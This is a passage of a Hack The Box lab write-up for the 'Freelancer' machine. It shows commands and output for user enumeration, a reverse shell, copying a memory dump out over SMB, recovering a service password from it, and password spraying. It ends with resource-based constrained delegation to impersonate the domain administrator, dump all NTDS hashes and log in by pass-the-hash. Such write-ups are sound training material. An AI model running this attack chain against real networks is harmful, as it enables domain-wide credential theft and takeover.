+taylor
+jmartinez
+olivia.garcia
+dthomas
+sophia.h
+Ethan.l
+wwalker
+jgreen
+evelyn.adams
+hking
+alex.hill
+samuel.turner
+ereed
+leon.sk
+DATAC2-2022$
+WS1-WIIN10$
+WS2-WIN11$
+WS3-WIN11$
+DC2$
+carol.poland
+lkazanof
+SETUPMACHINE$</code></pre><p>Ill use <code>--rid-brute</code> to also grab machine accounts</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc.freelancer.htb -u mikasaAckerman -p &#39;IL0v3ErenY3ager&#39; --users
+SMB         10.129.66.164   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.66.164   445    DC               [+] freelancer.htb\mikasaAckerman:IL0v3ErenY3ager 
+SMB         10.129.66.164   445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
+SMB         10.129.66.164   445    DC               Administrator                 2024-05-27 17:59:50 0       Built-in account for administering the computer/domain 
+SMB         10.129.66.164   445    DC               Guest                         &lt;never&gt;             0       Built-in account for guest access to the computer/domain 
+SMB         10.129.66.164   445    DC               krbtgt                        2023-08-24 01:47:22 0       Key Distribution Center Service Account 
+SMB         10.129.66.164   445    DC               mikasaAckerman                2024-05-27 17:58:13 0       Database Developer 
+SMB         10.129.66.164   445    DC               sshd                          2023-08-28 18:30:29 0        
+SMB         10.129.66.164   445    DC               SQLBackupOperator             2023-09-21 07:26:05 1       SQL Backup Operator Account for Temp Schudeled SQL Express Backups 
+SMB         10.129.66.164   445    DC               sql_svc                       2023-11-02 19:10:09 1       MSSQL Database Domain Account 
+SMB         10.129.66.164   445    DC               lorra199                      2023-10-04 12:19:13 1       IT Support Technician 
+SMB         10.129.66.164   445    DC               maya.artmes                   2023-10-12 01:15:22 0       System Analyzer 
+SMB         10.129.66.164   445    DC               michael.williams              2023-10-12 01:40:29 0       Department Manager 
+SMB         10.129.66.164   445    DC               sdavis                        2023-10-12 01:44:58 0       IT Support 
+SMB         10.129.66.164   445    DC               d.jones                       2023-10-12 01:49:15 0       Software Developer 
+SMB         10.129.66.164   445    DC               jen.brown                     2023-10-12 01:51:04 0       Software Developer 
+SMB         10.129.66.164   445    DC               taylor                        2023-10-12 01:52:40 0       Human Resources Specialist 
+SMB         10.129.66.164   445    DC               jmartinez                     2023-10-12 01:57:32 0       Executive Manager 
+SMB         10.129.66.164   445    DC               olivia.garcia                 2023-10-12 02:19:04 0       WSGI Manager 
+SMB         10.129.66.164   445    DC               dthomas                       2023-10-12 02:45:32 0       System Analyzer 
+SMB         10.129.66.164   445    DC               sophia.h                      2023-10-12 03:02:17 0       Datacenter Manager 
+SMB         10.129.66.164   445    DC               Ethan.l                       2023-10-12 03:11:23 0       DJango Developer 
+SMB         10.129.66.164   445    DC               wwalker                       2023-10-12 03:20:06 0       Active Directory Trusts Manager 
+SMB         10.129.66.164   445    DC               jgreen                        2023-10-12 03:25:04 0       Active Directory Accounts Operator 
+SMB         10.129.66.164   445    DC               evelyn.adams                  2023-10-12 03:27:06 0       Active Directory Accounts Operator 
+SMB         10.129.66.164   445    DC               hking                         2023-10-12 03:35:58 0        
+SMB         10.129.66.164   445    DC               alex.hill                     2023-10-12 03:40:27 0       DJango Developer 
+SMB         10.129.66.164   445    DC               samuel.turner                 2023-10-12 03:43:51 0        
+SMB         10.129.66.164   445    DC               ereed                         2023-10-12 04:04:24 0       Site Reliability Engineer (SRE) 
+SMB         10.129.66.164   445    DC               leon.sk                       2023-11-02 05:20:04 0       Site Reliability Engineer (SRE) 
+SMB         10.129.66.164   445    DC               carol.poland                  2023-11-02 06:20:51 0       IT Technician 
+SMB         10.129.66.164   445    DC               lkazanof                      2023-10-19 23:39:28 1       System Reliability Monitor (SRM) &amp; Account Operator 
+SMB         10.129.66.164   445    DC               [*] Enumerated 29 local users: FREELANCER</code></pre><p>Also using <code>--users</code> is helpful here since the users contains some descriptions</p><p>There is also nothing interesting in bloodhound</p><h2>Shell as <code>mikasaAckerman</code></h2><p>To do this ill grab RunasCs from github and upload it</p><p>Ill transfer it using a python web server</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PS C:\temp&gt; .\RunasCs.exe mikasaAckerman IL0v3ErenY3ager cmd.exe -r 10.10.14.61:1338
+.\RunasCs.exe mikasaAckerman IL0v3ErenY3ager cmd.exe -r 10.10.14.61:1338
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-4aa64$\Default
+[+] Async process &#39;C:\WINDOWS\system32\cmd.exe&#39; with pid 4628 created in background.
+PS C:\temp&gt;</code></pre><p>Ill send a connection</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">penelope -p 1338         
+[+] Listening for reverse shells on 0.0.0.0:1338 -&gt; 127.0.0.1 • 192.168.86.128 • 10.10.14.61
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] =&gt; DC 10.129.66.164 Microsoft_Windows_Server_2019_Standard-x64-based_PC 👤 freelancer\mikasaackerman 😍️ Session ID &lt;1&gt;
+[+] Added readline support...
+[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
+[+] Session log: /home/kali/.penelope/sessions/DC~10.129.66.164-Microsoft_Windows_Server_2019_Standard-x64-based_PC/2026_10_03-15_05_29-182.log
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────
+C:\WINDOWS\system32&gt;</code></pre><p><img src="images/freelancer/pasted-image-20261003150605.webp" alt="Screenshot" loading="lazy" /></p><p>I now have a shell as this user</p><h2>Analysis of memory dump</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">C:\Users\mikasaAckerman\Desktop&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 8954-28AE
+
+ Directory of C:\Users\mikasaAckerman\Desktop
+
+05/28/2024  10:22 AM    &lt;DIR&gt;          .
+05/28/2024  10:22 AM    &lt;DIR&gt;          ..
+10/28/2023  06:23 PM             1,468 mail.txt
+10/04/2023  01:47 PM       292,692,678 MEMORY.7z
+10/03/2026  02:03 PM                34 user.txt
+               3 File(s)    292,694,180 bytes
+               2 Dir(s)   2,604,904,448 bytes free
+
+C:\Users\mikasaAckerman\Desktop&gt;</code></pre><p>I can grab user, there is also some other interesting files on the desktop</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">C:\Users\mikasaAckerman\Desktop&gt;type mail.txt
+type mail.txt
+Hello Mikasa,
+I tried once again to work with Liza Kazanoff after seeking her help to troubleshoot the BSOD issue on the &quot;DATACENTER-2019&quot; computer. As you know, the problem started occurring after we installed the new update of SQL Server 2019.
+I attempted the solutions you provided in your last email, but unfortunately, there was no improvement. Whenever we try to establish a remote SQL connection to the installed instance, the server&#39;s CPU starts overheating, and the RAM usage keeps increasing until the BSOD appears, forcing the server to restart.
+Nevertheless, Liza has requested me to generate a full memory dump on the Datacenter and send it to you for further assistance in troubleshooting the issue.
+Best regards,
+
+C:\Users\mikasaAckerman\Desktop&gt;</code></pre><p>Looks like this is a memory dump file</p><p>Ill transfer the 7 zip archive to my system using impackets SMB server</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">smbserver.py share $(pwd) -smb2support -username hacker -password hackme
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies</code></pre><p>Ill start the SMB server on my system</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PS C:\Users\mikasaAckerman\Desktop&gt; net use Z: \\10.10.14.61\share /user:hacker hackme
+net use Z: \\10.10.14.61\share /user:hacker hackme
+The command completed successfully.
+
+PS C:\Users\mikasaAckerman\Desktop&gt;</code></pre><p>Ill set where to send the file</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PS C:\Users\mikasaAckerman\Desktop&gt; Copy-Item .\MEMORY.7z Z:\</code></pre><p>Then ill copy it over</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">7z x MEMORY.7z 
+
+7-Zip 26.02 (x64) : Copyright (c) 1999-2026 Igor Pavlov : 2026-06-25
+ 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:4096, ASM
+
+Scanning the drive for archives:
+1 file, 292692678 bytes (280 MiB)
+
+Extracting archive: MEMORY.7z
+--
+Path = MEMORY.7z
+Type = 7z
+Physical Size = 292692678
+Headers Size = 130
+Method = LZMA2:26
+Solid = -
+Blocks = 1
+
+Everything is Ok 
+
+Size:       1782252040
+Compressed: 292692678</code></pre><p>Ill then extract it on my system</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">python3 -m venv vol3-env &amp;&amp; source vol3-env/bin/activate 
+pip install volatility3
+pip3 install pycryptodome</code></pre><p>Ill install volatility3 to my machine in a virtual environment</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">vol -f MEMORY.DMP windows.registry.hashdump.Hashdump
+Volatility 3 Framework 2.28.2
+Progress:  100.00		PDB scanning finished                                
+User	rid	lmhash	nthash
+
+Administrator	500	aad3b435b51404eeaad3b435b51404ee	725180474a181356e53f4fe3dffac527
+Guest	501	aad3b435b51404eeaad3b435b51404ee	31d6cfe0d16ae931b73c59d7e0c089c0
+DefaultAccount	503	aad3b435b51404eeaad3b435b51404ee	31d6cfe0d16ae931b73c59d7e0c089c0
+WDAGUtilityAccount	504	aad3b435b51404eeaad3b435b51404ee	04fc56dd3ee3165e966ed04ea791d7a7</code></pre><p>Ill use volatility3 to do some analysis on this</p><p>None of these hashes work however</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">vol -f MEMORY.DMP windows.registry.lsadump.Lsadump
+
+...[SNIP]...
+
+_SC_MSSQL$DATA	
+2a 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 *...............
+50 00 57 00 4e 00 33 00 44 00 23 00 6c 00 30 00 P.W.N.3.D.#.l.0.
+72 00 72 00 40 00 41 00 72 00 6d 00 65 00 73 00 r.r.@.A.r.m.e.s.
+73 00 61 00 31 00 39 00 39 00 00 00 00 00 00 00 s.a.1.9.9.......	2a 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 50 00 57 00 4e 00 33 00 44 00 23 00 6c 00 30 00 72 00 72 00 40 00 41 00 72 00 6d 00 65 00 73 00 73 00 61 00 31 00 39 00 39 00 00 00 00 00 00 00</code></pre><p>That&#39;s a UTF-16LE (wide-char) string - Windows encodes text this way, which is why every ASCII byte is followed by a null (<code>00</code>). Decoding the second block:</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PWN3D#l0rr@Armessa199</code></pre><p>This looks like a password</p><h2>Password spray leads to user compromise</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc.freelancer.htb -u users.txt -p &#39;PWN3D#l0rr@Armessa199&#39; --continue-on-success
+
+SMB         10.129.66.164   445    DC               [+] freelancer.htb\lorra199:PWN3D#l0rr@Armessa199 </code></pre><p>This user is compromised!</p><h2>Enumeration of <code>lorra199</code></h2><p><img src="images/freelancer/pasted-image-20261003161545.webp" alt="Screenshot" loading="lazy" /></p><p>She is part of remote management users</p><p>She also has <code>70</code> outbound object control???</p><p><img src="images/freelancer/pasted-image-20261003161656.webp" alt="Screenshot" loading="lazy" /></p><p>This is the most interesting vector here, but there is more than likely several ways to get to domain admin using this user due to the amount of outbount</p><h2>Domain Admin via Resource Based Constrained Delegation</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">bloodyAD --host dc.freelancer.htb -d freelancer.htb -u lorra199 -p &#39;PWN3D#l0rr@Armessa199&#39; get writable --detail --otype computer | grep -C 200 &#39;CN=DC,OU=Domain Controllers,DC=freelancer,DC=htb&#39;
+
+...[SNIP]...
+
+msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE</code></pre><p>I also had write to the key credentials link, but after trying to apply shadow creds it fails, likely due to no support for PKINIT</p><p>But i can abuse this using RBCD</p><p><a href="https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd" target="_blank" rel="noreferrer">https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd</a></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc ldap dc.freelancer.htb -u lorra199 -p &#39;PWN3D#l0rr@Armessa199&#39; -M maq
+LDAP        10.129.66.164   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:freelancer.htb) (signing:None) (channel binding:No TLS cert) 
+LDAP        10.129.66.164   389    DC               [+] freelancer.htb\lorra199:PWN3D#l0rr@Armessa199 
+MAQ         10.129.66.164   389    DC               [*] Getting the MachineAccountQuota
+MAQ         10.129.66.164   389    DC               MachineAccountQuota: 10</code></pre><p>Checking the machine account quota, i see its set to 10, so that makes this even easier</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc.freelancer.htb -u lorra199 -p &#39;PWN3D#l0rr@Armessa199&#39; -M add-computer -o NAME=EVIL PASSWORD=Password123!
+SMB         10.129.66.164   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.66.164   445    DC               [+] freelancer.htb\lorra199:PWN3D#l0rr@Armessa199 
+ADD-COMP... 10.129.66.164   445    DC               Successfully added the machine account: &#39;EVIL$&#39; with Password: &#39;Password123!&#39;</code></pre><p>First ill use nxc to add a computer account</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">rbcd.py -delegate-to &quot;DC$&quot; -dc-ip 10.129.66.164 -action &#39;read&#39; &#39;freelancer.htb/lorra199:PWN3D#l0rr@Armessa199&#39;
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty</code></pre><p>As seen here the attribute is empty</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">rbcd.py -delegate-from &quot;EVIL$&quot; -delegate-to &quot;DC$&quot; -dc-ip 10.129.66.164 -action &#39;write&#39; &#39;freelancer.htb/lorra199:PWN3D#l0rr@Armessa199&#39;             
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+[*] Delegation rights modified successfully!
+[*] EVIL$ can now impersonate users on DC$ via S4U2Proxy
+[*] Accounts allowed to act on behalf of other identity:
+[*]     EVIL$        (S-1-5-21-3542429192-2036945976-3483670807-12101)</code></pre><p>Ill configure the delegation with my new machine account i made</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">faketime -f +5h getST.py -spn &#39;cifs/dc.freelancer.htb&#39; -impersonate &quot;Administrator&quot; -dc-ip 10.129.66.164 &quot;freelancer.htb&quot;/&quot;EVIL$&quot;:&#39;Password123!&#39;
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@cifs_dc.freelancer.htb@FREELANCER.HTB.ccache</code></pre><p>Then after syncing to the DC, i can get an administrator TGT</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">faketime -f +5h nxc smb dc.freelancer.htb --use-kcache
+SMB         dc.freelancer.htb 445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         dc.freelancer.htb 445    DC               [+] FREELANCER\Administrator from ccache (Pwn3d!)</code></pre><p>Now as seen here i can auth as the DA</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">faketime -f +5h nxc smb dc.freelancer.htb --use-kcache --ntds
+SMB         dc.freelancer.htb 445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         dc.freelancer.htb 445    DC               [+] FREELANCER\Administrator from ccache (Pwn3d!)
+SMB         dc.freelancer.htb 445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         dc.freelancer.htb 445    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:0039318f1e8274633445bce32ad1a290:::
+SMB         dc.freelancer.htb 445    DC               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         dc.freelancer.htb 445    DC               krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d238e0bfa17d575038efc070187a91c2:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\mikasaAckerman:1105:aad3b435b51404eeaad3b435b51404ee:e8d62c7d57e5d74267ab6feb2f662674:::
+SMB         dc.freelancer.htb 445    DC               sshd:1108:aad3b435b51404eeaad3b435b51404ee:c1e83616271e8e17d69391bdcd335ab4:::
+SMB         dc.freelancer.htb 445    DC               SQLBackupOperator:1112:aad3b435b51404eeaad3b435b51404ee:c4b746db703d1af5575b5c3d69f57bab:::
+SMB         dc.freelancer.htb 445    DC               sql_svc:1114:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::
+SMB         dc.freelancer.htb 445    DC               lorra199:1116:aad3b435b51404eeaad3b435b51404ee:67d4ae78a155aab3d4aa602da518c051:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\maya.artmes:1124:aad3b435b51404eeaad3b435b51404ee:22db50a324b9a34ea898a290c1284e25:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\michael.williams:1126:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\sdavis:1127:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\d.jones:1128:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\jen.brown:1129:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\taylor:1130:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\jmartinez:1131:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\olivia.garcia:1133:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\dthomas:1134:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\sophia.h:1135:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\Ethan.l:1138:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\wwalker:1141:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\jgreen:1142:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\evelyn.adams:1143:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\hking:1144:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\alex.hill:1145:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\samuel.turner:1146:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\ereed:1149:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\leon.sk:1151:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\carol.poland:1160:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::
+SMB         dc.freelancer.htb 445    DC               freelancer.htb\lkazanof:1162:aad3b435b51404eeaad3b435b51404ee:a26c33c2878b23df8b2da3d10e430a0f:::
+SMB         dc.freelancer.htb 445    DC               DC$:1000:aad3b435b51404eeaad3b435b51404ee:89851d57d9c8cc8addb66c59b83a4379:::
+SMB         dc.freelancer.htb 445    DC               DATACENTER-2019$:1115:aad3b435b51404eeaad3b435b51404ee:7a8b0efef4571ec55cc0b9f8cb73fdcf:::
+SMB         dc.freelancer.htb 445    DC               DATAC2-2022$:1155:aad3b435b51404eeaad3b435b51404ee:007a710c0581c63104dad1e477c794e8:::
+SMB         dc.freelancer.htb 445    DC               WS1-WIIN10$:1156:aad3b435b51404eeaad3b435b51404ee:57e57c6a3f0f8fff74e8ab524871616b:::
+SMB         dc.freelancer.htb 445    DC               WS2-WIN11$:1157:aad3b435b51404eeaad3b435b51404ee:bf5267ee6236c86a3596f72f2ddef2da:::
+SMB         dc.freelancer.htb 445    DC               WS3-WIN11$:1158:aad3b435b51404eeaad3b435b51404ee:732c190482eea7b5e6777d898e352225:::
+SMB         dc.freelancer.htb 445    DC               DC2$:1159:aad3b435b51404eeaad3b435b51404ee:e1018953ffa39b3818212aba3f736c0f:::
+SMB         dc.freelancer.htb 445    DC               SETUPMACHINE$:8601:aad3b435b51404eeaad3b435b51404ee:f5912663ecf2c8cbda2a4218127d11fe:::
+SMB         dc.freelancer.htb 445    DC               EVIL$:12101:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+SMB         dc.freelancer.htb 445    DC               [+] Dumped 38 NTDS hashes to /home/kali/.nxc/logs/ntds/DC_dc.freelancer.htb_2026-10-03_220357.ntds of which 29 were added to the database
+SMB         dc.freelancer.htb 445    DC               [*] To extract only enabled accounts from the output file, run the following command: 
+SMB         dc.freelancer.htb 445    DC               [*] grep -iv disabled /home/kali/.nxc/logs/ntds/DC_dc.freelancer.htb_2026-10-03_220357.ntds | cut -d &#39;:&#39; -f1</code></pre><p>Then ill just dump the NTDS, this can also be done with impackets secretsdump</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py -i dc.freelancer.htb -u Administrator -H 0039318f1e8274633445bce32ad1a290
+          _ _            _                             
+  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
+ / -_\ V | | |___\ V  V | | &#39; \| &#39;_| &#39;  |___| &#39;_ | || |
+ \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
+                                            |_|   |__/  v1.6.0
+
+[*] Connecting to &#39;dc.freelancer.htb:5985&#39; as &#39;Administrator&#39;
+evil-winrm-py PS C:\Users\Administrator\Documents&gt; whoami
+freelancer\administrator
+evil-winrm-py PS C:\Users\Administrator\Documents&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State  
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+evil-winrm-py PS C:\Users\Administrator\Documents&gt;</code></pre><p>Domain Admin!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\Users\Administrator\Documents&gt; cd ../Desktop
+evil-winrm-py PS C:\Users\Administrator\Desktop&gt; dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name                                                                   
+----                -------------         ------ ----                                                                   
+-ar---        10/3/2026   2:03 PM             34 root.txt                                                               
+
+
+evil-winrm-py PS C:\Users\Administrator\Desktop&gt;</code></pre><p>Then i can get <code>root.txt</code></p></div><footer class="writeup-article-footer"><nav class="writeup-viewer-pagination writeup-page-pager" aria-label="More writeups"><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-infiltrator/" rel="prev"><span class="writeup-nav-direction">Previous</span><span class="writeup-nav-title">Infiltrator</span></a><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-object/" rel="next"><span class="writeup-nav-direction">Next</span><span class="writeup-nav-title">Object</span></a></nav><a href="/writeups/">← All writeups</a></footer></article></main><footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/writeups/">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/field-guides/">Field guides</a><a href="/#talks">Talks</a><a href="/#observer">Observer</a><a href="/#threat-actors">Threat Actors</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer></div><script type="module" src="/js/writeup-page.js?v=search2"></script></body></html>
